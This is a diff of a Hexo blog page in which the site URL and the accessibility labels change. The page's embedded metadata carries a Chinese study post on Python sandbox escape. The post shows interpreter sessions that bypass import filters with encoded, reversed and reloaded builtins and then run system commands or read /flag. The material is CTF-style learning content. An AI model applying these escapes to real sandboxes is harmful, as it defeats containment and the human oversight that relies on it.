@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"第一篇主要学习导入模块的方式\n\n\n空格绕过分隔符用多个空格\n1234&gt;&gt;&gt; import os&gt;&gt;&gt; import  os&gt;&gt;&gt; import   os&gt;&gt;&gt; import   sys\n\n同义词绕过_import_1234&gt;&gt;&gt; __import__('os')&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; __import__('os').system('ls')公共  图片  音乐\tcore   hash_extender  pick.py\t static\n\n_importlib_123456&gt;&gt;&gt; import importlib&gt;&gt;&gt; p1k=importlib.import_module('bf'.decode('rot-13'))&gt;&gt;&gt; p1k&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; p1k.system('whoami')root\n\nexecfilepython导入库，实际上就是执行一次库文件(2.x版本可用，3.x版本删除execfile)\n123&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)&gt;&gt;&gt; system(&apos;ls&apos;)公共  图片  音乐\tcore   hash_extender  pick.py\t static\n\n2.x 3.x 通用的方法\n123with open('/usr/lib/python3.6/os.py','r') as f:    exec(f.read())system('ls')\n\n执行一下\n12root@kali:~# python3 11.py 11.py  视频\n\n内建模块python中直接使用的内置函数 例如open() int() chr() 是随着内建模块一同被导入的，python2.x中称为__builtin__\n3.x中称为builtins\n12&gt;&gt;&gt; __builtins__.open('/flag').read()'sss'\n\nbuiltin builtins  \\builtin__  \\builtins__  的区别\n__builtins__是不能导入的，__builtin__是可以导入的，由此可见，实际上并没有\\builtins__模块，\\builtins__模块实际上是python解释器创建的一个对\\builtin__(2.x)  builtins(3.x)模块的引用\n12345&gt;&gt;&gt; import __builtins__Traceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ImportError: No module named __builtins__&gt;&gt;&gt; import __builtin__\n\n__dict__获取对象属性，一个模块对象有一个由字典对象实现的命名空间，模块中的属性引用被转为在这个字典中的查找，例如m.x ==&gt;m.dict[‘x’]  \n1234567&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')rootbase64编码__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('whoami')反转&gt;&gt;&gt; __builtins__.__dict__['__tropmi__'[::-1]]('os').system('whoami')root\n\n模块被删除12&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules['os']=None\n\n路径导入导入os试试\n1234&gt;&gt;&gt; import osTraceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ImportError: No module named os\n\n不能被导入，针对上面需要路径的，大都是默认路径，如果sys没被干掉可以使用sys.path看一下\n123&gt;&gt;&gt; import sys&gt;&gt;&gt; print syspath['', '/usr/lib/python2.7',\n\n利用路径导入os\n12&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os'&gt;&gt;&gt; import os\n\nreload重载当一些函数被破坏或者删除的时候，\n12__builtins__.__dict__['eval'] = 'not allowed' //破坏evaldel __builtins__.__dict__['eval']           //删除eval\n\n可以使用reload重载来恢复。注意python2.x中reload在__builtins__模块中，python3.x中reload在imp模块中\n123456789&gt;&gt;&gt; del __builtins__.__dict__['eval']&gt;&gt;&gt; evalTraceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;NameError: name 'eval' is not defined&gt;&gt;&gt; reload(__builtins__)&lt;module '__builtin__' (built-in)&gt;&gt;&gt;&gt; eval&lt;built-in function eval&gt;\n\npython3.x引入reload\n123&gt;&gt;&gt; import imp&gt;&gt;&gt; imp.reload(__builtins__)&lt;module 'builtins' (built-in)&gt;\n\n小结：大多数的关键词都是可以通过编码 反转这些绕过的\n参考链接\nhttp://yulige.top/?p=502\nhttps://www.freebuf.com/articles/system/203208.html\n","dateCreated":"2019-09-11T21:36:13+08:00","dateModified":"2019-09-14T16:16:08+08:00","datePublished":"2019-09-11T21:36:13+08:00","description":"第一篇主要学习导入模块的方式","headline":"python沙盒逃逸one","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/11/python沙盒逃逸one/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/11/python沙盒逃逸one/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"第一篇主要学习导入模块的方式\n\n\n空格绕过分隔符用多个空格\n1234&gt;&gt;&gt; import os&gt;&gt;&gt; import  os&gt;&gt;&gt; import   os&gt;&gt;&gt; import   sys\n\n同义词绕过_import_1234&gt;&gt;&gt; __import__('os')&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; __import__('os').system('ls')公共  图片  音乐\tcore   hash_extender  pick.py\t static\n\n_importlib_123456&gt;&gt;&gt; import importlib&gt;&gt;&gt; p1k=importlib.import_module('bf'.decode('rot-13'))&gt;&gt;&gt; p1k&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; p1k.system('whoami')root\n\nexecfilepython导入库，实际上就是执行一次库文件(2.x版本可用，3.x版本删除execfile)\n123&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)&gt;&gt;&gt; system(&apos;ls&apos;)公共  图片  音乐\tcore   hash_extender  pick.py\t static\n\n2.x 3.x 通用的方法\n123with open('/usr/lib/python3.6/os.py','r') as f:    exec(f.read())system('ls')\n\n执行一下\n12root@kali:~# python3 11.py 11.py  视频\n\n内建模块python中直接使用的内置函数 例如open() int() chr() 是随着内建模块一同被导入的，python2.x中称为__builtin__\n3.x中称为builtins\n12&gt;&gt;&gt; __builtins__.open('/flag').read()'sss'\n\nbuiltin builtins  \\builtin__  \\builtins__  的区别\n__builtins__是不能导入的，__builtin__是可以导入的，由此可见，实际上并没有\\builtins__模块，\\builtins__模块实际上是python解释器创建的一个对\\builtin__(2.x)  builtins(3.x)模块的引用\n12345&gt;&gt;&gt; import __builtins__Traceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ImportError: No module named __builtins__&gt;&gt;&gt; import __builtin__\n\n__dict__获取对象属性，一个模块对象有一个由字典对象实现的命名空间，模块中的属性引用被转为在这个字典中的查找，例如m.x ==&gt;m.dict[‘x’]  \n1234567&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')rootbase64编码__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('whoami')反转&gt;&gt;&gt; __builtins__.__dict__['__tropmi__'[::-1]]('os').system('whoami')root\n\n模块被删除12&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules['os']=None\n\n路径导入导入os试试\n1234&gt;&gt;&gt; import osTraceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ImportError: No module named os\n\n不能被导入，针对上面需要路径的，大都是默认路径，如果sys没被干掉可以使用sys.path看一下\n123&gt;&gt;&gt; import sys&gt;&gt;&gt; print syspath['', '/usr/lib/python2.7',\n\n利用路径导入os\n12&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os'&gt;&gt;&gt; import os\n\nreload重载当一些函数被破坏或者删除的时候，\n12__builtins__.__dict__['eval'] = 'not allowed' //破坏evaldel __builtins__.__dict__['eval']           //删除eval\n\n可以使用reload重载来恢复。注意python2.x中reload在__builtins__模块中，python3.x中reload在imp模块中\n123456789&gt;&gt;&gt; del __builtins__.__dict__['eval']&gt;&gt;&gt; evalTraceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;NameError: name 'eval' is not defined&gt;&gt;&gt; reload(__builtins__)&lt;module '__builtin__' (built-in)&gt;&gt;&gt;&gt; eval&lt;built-in function eval&gt;\n\npython3.x引入reload\n123&gt;&gt;&gt; import imp&gt;&gt;&gt; imp.reload(__builtins__)&lt;module 'builtins' (built-in)&gt;\n\n小结：大多数的关键词都是可以通过编码 反转这些绕过的\n参考链接\nhttp://yulige.top/?p=502\nhttps://www.freebuf.com/articles/system/203208.html\n","dateCreated":"2019-09-11T21:36:13+08:00","dateModified":"2019-09-14T16:16:08+08:00","datePublished":"2019-09-11T21:36:13+08:00","description":"第一篇主要学习导入模块的方式","headline":"python沙盒逃逸one","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"}</script>
     <meta name="description" content="第一篇主要学习导入模块的方式">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="python沙盒逃逸one">
-<meta property="og:url" content="http://yoursite.com/2019/09/11/python沙盒逃逸one/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/09/11/python沙盒逃逸one/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="第一篇主要学习导入模块的方式">
 <meta property="og:locale" content="zh-cn">
@@ -304,7 +304,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -315,7 +315,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -328,7 +328,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -341,7 +341,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -354,7 +354,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -419,7 +419,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -430,7 +430,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -443,7 +443,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -456,7 +456,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -469,7 +469,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -490,7 +490,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -503,7 +503,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -516,7 +516,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/11/python沙盒逃逸one/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
